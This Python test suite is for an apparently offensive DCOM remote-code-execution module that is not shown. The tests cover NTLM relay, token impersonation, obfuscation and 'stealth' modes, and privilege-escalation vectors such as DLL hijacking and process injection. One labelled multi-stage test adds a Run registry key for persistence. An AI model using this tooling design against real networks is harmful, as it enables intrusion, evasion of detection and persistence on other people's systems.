#!/usr/bin/env python3
"""
Test Suite for DCOM RCE Executor
=================================

Comprehensive testing of DCOM remote code execution capabilities including:
- Connection establishment and authentication
- Payload creation and marshalling
- Obfuscation techniques
- Privilege escalation vectors
- Multi-method execution chains
"""

import json
import unittest
from dcom_rce_executor import (
    DCOMExecutor,
    DCOMConfig,
    DCOMExploitPayload,
    DCOMMarshaller,
    AuthenticationManager,
    PayloadObfuscator,
    DCOMObjectClass,
    AuthenticationMethod,
    PrivilegeEscalationVec,
    ObfuscationTechnique,
    create_dcom_executor
)


class TestDCOMMarshaller(unittest.TestCase):
    """Test COM marshalling functionality"""

    def setUp(self):
        self.marshaller = DCOMMarshaller()

    def test_marshal_unmarshal_roundtrip(self):
        """Test marshalling and unmarshalling roundtrip"""
        original_data = {
            'command': 'whoami',
            'method': 'Execute',
            'iid': 'F7F34F88-6B4E-4B2D-AF9A-D64E3B2C6D7E'
        }

        marshalled = self.marshaller.marshal_object(original_data)
        self.assertIsInstance(marshalled, bytes)
        self.assertGreater(len(marshalled), 20)

        unmarshalled = self.marshaller.unmarshal_object(marshalled)
        self.assertEqual(unmarshalled['command'], original_data['command'])
        self.assertEqual(unmarshalled['method'], original_data['method'])

    def test_uuid_encoding(self):
        """Test UUID encoding and decoding"""
        test_uuid = '49B2BA30-1A7F-46F3-B1F4-6937F0FE1056'
        encoded = self.marshaller._encode_uuid(test_uuid)
        self.assertEqual(len(encoded), 16)

        decoded = self.marshaller._decode_uuid(encoded)
        self.assertEqual(decoded.upper(), test_uuid.upper())

    def test_invalid_uuid_handling(self):
        """Test handling of invalid UUIDs"""
        encoded = self.marshaller._encode_uuid('invalid-uuid')
        self.assertEqual(len(encoded), 16)
        self.assertEqual(encoded, b'\x00' * 16)

    def test_marshal_empty_object(self):
        """Test marshalling empty object"""
        marshalled = self.marshaller.marshal_object({})
        unmarshalled = self.marshaller.unmarshal_object(marshalled)
        self.assertIsInstance(unmarshalled, dict)


class TestAuthenticationManager(unittest.TestCase):
    """Test authentication functionality"""

    def setUp(self):
        self.config = DCOMConfig(
            target_host="192.168.1.100",
            username="Administrator",
            password="Password123!",
            domain="CORP"
        )

    def test_ntlm_authentication(self):
        """Test NTLM authentication"""
        self.config.auth_method = AuthenticationMethod.NTLM
        auth = AuthenticationManager(self.config)
        self.assertTrue(auth.establish_auth())
        self.assertIsNotNone(auth.auth_token)

    def test_kerberos_authentication(self):
        """Test Kerberos authentication"""
        self.config.auth_method = AuthenticationMethod.KERBEROS
        auth = AuthenticationManager(self.config)
        self.assertTrue(auth.establish_auth())
        self.assertIsNotNone(auth.auth_token)

    def test_negotiate_authentication(self):
        """Test SPNEGO Negotiate authentication"""
        self.config.auth_method = AuthenticationMethod.NEGOTIATE
        auth = AuthenticationManager(self.config)
        self.assertTrue(auth.establish_auth())
        self.assertIsNotNone(auth.auth_token)

    def test_anonymous_authentication(self):
        """Test anonymous authentication"""
        self.config.auth_method = AuthenticationMethod.NONE
        auth = AuthenticationManager(self.config)
        self.assertTrue(auth.establish_auth())

    def test_impersonation_setup(self):
        """Test token impersonation setup"""
        self.config.auth_method = AuthenticationMethod.IMPERSONATION
        auth = AuthenticationManager(self.config)
        self.assertTrue(auth.establish_auth())
        self.assertIsNotNone(auth.auth_token)

    def test_delegation_setup(self):
        """Test delegation setup"""
        self.config.auth_method = AuthenticationMethod.DELEGATION
        self.config.use_delegation = True
        auth = AuthenticationManager(self.config)
        self.assertTrue(auth.establish_auth())
        self.assertIsNotNone(auth.auth_token)

    def test_relay_setup(self):
        """Test NTLM relay setup"""
        self.config.auth_method = AuthenticationMethod.RELAY
        auth = AuthenticationManager(self.config)
        self.assertTrue(auth.establish_auth())
        self.assertIsNotNone(auth.session_key)

    def test_ntlm_type1_message(self):
        """Test NTLM Type 1 message creation"""
        auth = AuthenticationManager(self.config)
        msg = auth._create_ntlm_type1()
        self.assertTrue(msg.startswith(b'NTLMSSP\x00'))
        self.assertGreater(len(msg), 16)

    def test_ntlm_type3_message(self):
        """Test NTLM Type 3 message creation"""
        auth = AuthenticationManager(self.config)
        type2_msg = b'\x4e\x54\x4c\x4d\x53\x53\x50\x00'
        msg = auth._create_ntlm_type3(type2_msg)
        self.assertTrue(msg.startswith(b'NTLMSSP\x00'))


class TestPayloadObfuscator(unittest.TestCase):
    """Test payload obfuscation"""

    def setUp(self):
        self.config = DCOMConfig(
            target_host="192.168.1.100",
            enable_obfuscation=True
        )
        self.obfuscator = PayloadObfuscator(self.config)

    def test_no_obfuscation(self):
        """Test payload without obfuscation"""
        self.config.enable_obfuscation = False
        result, technique = self.obfuscator.obfuscate("whoami")
        self.assertEqual(result, "whoami")
        self.assertEqual(technique, "none")

    def test_base64_obfuscation(self):
        """Test base64 obfuscation"""
        self.config.obfuscation_methods = [ObfuscationTechnique.BASE64_ENCODING]
        command = "whoami"
        obfuscated, technique = self.obfuscator.obfuscate(command)
        self.assertNotEqual(obfuscated, command)
        self.assertIn("base64", technique)

    def test_hex_obfuscation(self):
        """Test hex obfuscation"""
        self.config.obfuscation_methods = [ObfuscationTechnique.HEX_ENCODING]
        command = "whoami"
        obfuscated, technique = self.obfuscator.obfuscate(command)
        self.assertNotEqual(obfuscated, command)
        self.assertIn("hex", technique)

    def test_xor_obfuscation(self):
        """Test XOR obfuscation"""
        self.config.obfuscation_methods = [ObfuscationTechnique.XOR_CIPHER]
        command = "whoami"
        obfuscated, technique = self.obfuscator.obfuscate(command)
        self.assertNotEqual(obfuscated, command)
        self.assertIn("xor", technique)

    def test_rc4_obfuscation(self):
        """Test RC4 obfuscation"""
        self.config.obfuscation_methods = [ObfuscationTechnique.RC4_CIPHER]
        command = "whoami"
        obfuscated, technique = self.obfuscator.obfuscate(command)
        self.assertNotEqual(obfuscated, command)

    def test_polyglot_obfuscation(self):
        """Test polyglot obfuscation"""
        self.config.obfuscation_methods = [ObfuscationTechnique.POLYGLOT_ENCODING]
        command = "whoami"
        obfuscated, technique = self.obfuscator.obfuscate(command)
        self.assertIn("POLYGLOT", obfuscated)

    def test_polymorphic_obfuscation(self):
        """Test polymorphic obfuscation"""
        self.config.obfuscation_methods = [ObfuscationTechnique.POLYMORPHIC_TRANSFORM]
        command = "whoami"
        obfuscated, technique = self.obfuscator.obfuscate(command)
        self.assertNotEqual(obfuscated, command)

    def test_dead_code_injection(self):
        """Test dead code injection"""
        self.config.obfuscation_methods = [ObfuscationTechnique.DEAD_CODE_INJECTION]
        command = "whoami"
        obfuscated, technique = self.obfuscator.obfuscate(command)
        self.assertIn("|", obfuscated)

    def test_control_flow_flattening(self):
        """Test control flow flattening"""
        self.config.obfuscation_methods = [ObfuscationTechnique.CONTROL_FLOW_FLATTEN]
        command = "whoami"
        obfuscated, technique = self.obfuscator.obfuscate(command)
        self.assertNotEqual(obfuscated, command)

    def test_string_obfuscation(self):
        """Test string obfuscation"""
        self.config.obfuscation_methods = [ObfuscationTechnique.STRING_OBFUSCATION]
        command = "whoami"
        obfuscated, technique = self.obfuscator.obfuscate(command)
        self.assertNotEqual(obfuscated, command)

    def test_junk_api_injection(self):
        """Test junk API injection"""
        self.config.obfuscation_methods = [ObfuscationTechnique.JUNK_API_CALLS]
        command = "whoami"
        obfuscated, technique = self.obfuscator.obfuscate(command)
        self.assertNotEqual(obfuscated, command)

    def test_multi_technique_obfuscation(self):
        """Test multi-technique obfuscation"""
        self.config.obfuscation_methods = [
            ObfuscationTechnique.BASE64_ENCODING,
            ObfuscationTechnique.XOR_CIPHER
        ]
        command = "whoami"
        obfuscated, technique = self.obfuscator.obfuscate(command)
        self.assertNotEqual(obfuscated, command)
        self.assertIn("|", technique)

    def test_base64_deobfuscation(self):
        """Test base64 deobfuscation"""
        self.config.obfuscation_methods = [ObfuscationTechnique.BASE64_ENCODING]
        command = "whoami"
        obfuscated, technique = self.obfuscator.obfuscate(command)
        deobfuscated = self.obfuscator.deobfuscate(obfuscated, technique)
        self.assertEqual(deobfuscated, command)

    def test_xor_deobfuscation(self):
        """Test XOR deobfuscation"""
        self.config.obfuscation_methods = [ObfuscationTechnique.XOR_CIPHER]
        command = "whoami"
        obfuscated, technique = self.obfuscator.obfuscate(command)
        deobfuscated = self.obfuscator.deobfuscate(obfuscated, technique)
        self.assertEqual(deobfuscated, command)


class TestDCOMExecutor(unittest.TestCase):
    """Test DCOM executor functionality"""

    def setUp(self):
        self.config = DCOMConfig(
            target_host="192.168.1.100",
            target_port=135,
            dcom_class=DCOMObjectClass.WMI_LOCATOR,
            auth_method=AuthenticationMethod.NEGOTIATE,
            username="Administrator",
            password="Password123!",
            domain="CORP",
            enable_obfuscation=True
        )
        self.executor = DCOMExecutor(self.config)

    def test_executor_initialization(self):
        """Test executor initialization"""
        self.assertEqual(self.executor.config.target_host, "192.168.1.100")
        self.assertEqual(self.executor.config.target_port, 135)
        self.assertFalse(self.executor.connection_established)

    def test_payload_creation(self):
        """Test payload creation"""
        payload = self.executor.create_payload("whoami")
        self.assertIsInstance(payload, DCOMExploitPayload)
        self.assertEqual(payload.command, "whoami")
        self.assertIsNotNone(payload.marshalled_object)
        self.assertIsNotNone(payload.execution_context)

    def test_connection_establishment(self):
        """Test connection establishment"""
        result = self.executor.establish_connection()
        self.assertTrue(result)
        self.assertTrue(self.executor.connection_established)

    def test_remote_command_execution(self):
        """Test remote command execution"""
        result = self.executor.execute_remote_command("whoami")
        self.assertTrue(result['success'])
        self.assertEqual(result['command'], "whoami")
        self.assertEqual(result['target_host'], "192.168.1.100")
        self.assertIn('payload_id', result)

    def test_multiple_command_execution(self):
        """Test multiple command execution"""
        commands = ["whoami", "ipconfig", "systeminfo"]
        for cmd in commands:
            result = self.executor.execute_remote_command(cmd)
            self.assertTrue(result['success'])

        self.assertEqual(len(self.executor.execution_history), 3)

    def test_dcom_object_class_support(self):
        """Test different DCOM object classes"""
        classes = [
            DCOMObjectClass.MMC_APPLICATION,
            DCOMObjectClass.EXCEL_APPLICATION,
            DCOMObjectClass.WORD_APPLICATION,
            DCOMObjectClass.WMI_LOCATOR,
            DCOMObjectClass.SHELL_WINDOWS
        ]

        for dcom_class in classes:
            self.config.dcom_class = dcom_class
            executor = DCOMExecutor(self.config)
            payload = executor.create_payload("test")
            self.assertEqual(payload.object_class, dcom_class)

    def test_authentication_method_support(self):
        """Test different authentication methods"""
        methods = [
            AuthenticationMethod.NTLM,
            AuthenticationMethod.KERBEROS,
            AuthenticationMethod.NEGOTIATE,
            AuthenticationMethod.IMPERSONATION,
            AuthenticationMethod.DELEGATION
        ]

        for auth_method in methods:
            self.config.auth_method = auth_method
            executor = DCOMExecutor(self.config)
            result = executor.establish_connection()
            # Some methods require specific conditions, just verify it was attempted
            self.assertIsNotNone(result)

    def test_polymorphic_execution(self):
        """Test polymorphic command execution"""
        result = self.executor.execute_polymorphic_command("whoami")
        self.assertTrue(result['success'])
        self.assertTrue(result['obfuscated'])

    def test_stealth_execution(self):
        """Test stealth command execution"""
        result = self.executor.execute_stealth_command("whoami")
        self.assertTrue(result['success'])
        self.assertTrue(result['obfuscated'])

    def test_privilege_escalation_injection(self):
        """Test privilege escalation via injection"""
        self.config.enable_eskalation = True
        self.config.escalation_vec = PrivilegeEscalationVec.PROCESS_INJECTION
        executor = DCOMExecutor(self.config)
        result = executor.execute_remote_command("whoami")
        self.assertIn('escalation', result)
        self.assertTrue(result['escalation']['success'])

    def test_privilege_escalation_impersonation(self):
        """Test privilege escalation via impersonation"""
        self.config.enable_eskalation = True
        self.config.escalation_vec = PrivilegeEscalationVec.TOKEN_IMPERSONATION
        executor = DCOMExecutor(self.config)
        result = executor.execute_remote_command("whoami")
        self.assertIn('escalation', result)

    def test_privilege_escalation_kernel_callback(self):
        """Test privilege escalation via kernel callback"""
        self.config.enable_eskalation = True
        self.config.escalation_vec = PrivilegeEscalationVec.KERNEL_CALLBACK
        executor = DCOMExecutor(self.config)
        result = executor.execute_remote_command("whoami")
        self.assertIn('escalation', result)

    def test_privilege_escalation_dll_hijacking(self):
        """Test privilege escalation via DLL hijacking"""
        self.config.enable_eskalation = True
        self.config.escalation_vec = PrivilegeEscalationVec.DLL_HIJACKING
        executor = DCOMExecutor(self.config)
        result = executor.execute_remote_command("whoami")
        self.assertIn('escalation', result)

    def test_privilege_escalation_registry(self):
        """Test privilege escalation via registry"""
        self.config.enable_eskalation = True
        self.config.escalation_vec = PrivilegeEscalationVec.REGISTRY_ELEVATION
        executor = DCOMExecutor(self.config)
        result = executor.execute_remote_command("whoami")
        self.assertIn('escalation', result)

    def test_privilege_escalation_service(self):
        """Test privilege escalation via service"""
        self.config.enable_eskalation = True
        self.config.escalation_vec = PrivilegeEscalationVec.SERVICE_EXPLOITATION
        executor = DCOMExecutor(self.config)
        result = executor.execute_remote_command("whoami")
        self.assertIn('escalation', result)

    def test_privilege_escalation_scheduled_task(self):
        """Test privilege escalation via scheduled task"""
        self.config.enable_eskalation = True
        self.config.escalation_vec = PrivilegeEscalationVec.SCHEDULED_TASK
        executor = DCOMExecutor(self.config)
        result = executor.execute_remote_command("whoami")
        self.assertIn('escalation', result)

    def test_privilege_escalation_com_marshalling(self):
        """Test privilege escalation via COM marshalling"""
        self.config.enable_eskalation = True
        self.config.escalation_vec = PrivilegeEscalationVec.COM_MARSHALLING
        executor = DCOMExecutor(self.config)
        result = executor.execute_remote_command("whoami")
        self.assertIn('escalation', result)

    def test_execution_report(self):
        """Test execution report generation"""
        self.executor.execute_remote_command("whoami")
        self.executor.execute_remote_command("ipconfig")

        report = self.executor.get_execution_report()
        self.assertEqual(report['total_executions'], 2)
        self.assertEqual(report['target_host'], "192.168.1.100")
        self.assertGreaterEqual(len(report['executions']), 2)

    def test_factory_function(self):
        """Test factory function"""
        executor = create_dcom_executor(
            target_host="192.168.1.100",
            dcom_class=DCOMObjectClass.WMI_LOCATOR,
            auth_method=AuthenticationMethod.NEGOTIATE
        )
        self.assertIsInstance(executor, DCOMExecutor)
        self.assertEqual(executor.config.target_host, "192.168.1.100")


class TestDCOMIntegration(unittest.TestCase):
    """Integration tests for DCOM RCE"""

    def test_full_execution_chain_wmi(self):
        """Test full execution chain with WMI"""
        executor = create_dcom_executor(
            target_host="192.168.1.100",
            dcom_class=DCOMObjectClass.WMI_LOCATOR,
            auth_method=AuthenticationMethod.NEGOTIATE,
            username="Administrator",
            password="Password123!",
            domain="CORP",
            enable_obfuscation=True,
            enable_eskalation=True,
            escalation_vec=PrivilegeEscalationVec.TOKEN_IMPERSONATION
        )

        result = executor.execute_remote_command("whoami")
        self.assertTrue(result['success'])

    def test_full_execution_chain_excel(self):
        """Test full execution chain with Excel"""
        executor = create_dcom_executor(
            target_host="192.168.1.100",
            dcom_class=DCOMObjectClass.EXCEL_APPLICATION,
            auth_method=AuthenticationMethod.NTLM,
            username="Administrator",
            password="Password123!",
            enable_obfuscation=True
        )

        result = executor.execute_remote_command("calc.exe")
        self.assertTrue(result['success'])

    def test_full_execution_chain_mmc(self):
        """Test full execution chain with MMC"""
        executor = create_dcom_executor(
            target_host="192.168.1.100",
            dcom_class=DCOMObjectClass.MMC_APPLICATION,
            auth_method=AuthenticationMethod.IMPERSONATION,
            enable_obfuscation=True,
            enable_eskalation=True
        )

        result = executor.execute_remote_command("powershell.exe -Command Get-Process")
        self.assertTrue(result['success'])

    def test_multi_stage_exploitation(self):
        """Test multi-stage exploitation"""
        executor = create_dcom_executor(
            target_host="192.168.1.100",
            enable_obfuscation=False,  # Disable obfuscation for consistent test
            enable_eskalation=True
        )

        # Stage 1: Initial access
        stage1 = executor.execute_remote_command("whoami")
        self.assertTrue(stage1['success'])

        # Stage 2: Privilege escalation
        stage2 = executor.execute_remote_command("systeminfo")
        self.assertTrue(stage2['success'])

        # Stage 3: Persistence
        stage3 = executor.execute_remote_command("reg add HKLM\\Software\\Microsoft\\Windows\\Run")
        self.assertTrue(stage3['success'])

        report = executor.get_execution_report()
        self.assertEqual(report['total_executions'], 3)


def run_tests():
    """Run all tests"""
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    suite.addTests(loader.loadTestsFromTestCase(TestDCOMMarshaller))
    suite.addTests(loader.loadTestsFromTestCase(TestAuthenticationManager))
    suite.addTests(loader.loadTestsFromTestCase(TestPayloadObfuscator))
    suite.addTests(loader.loadTestsFromTestCase(TestDCOMExecutor))
    suite.addTests(loader.loadTestsFromTestCase(TestDCOMIntegration))

    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    return result


if __name__ == "__main__":
    result = run_tests()
    exit(0 if result.wasSuccessful() else 1)
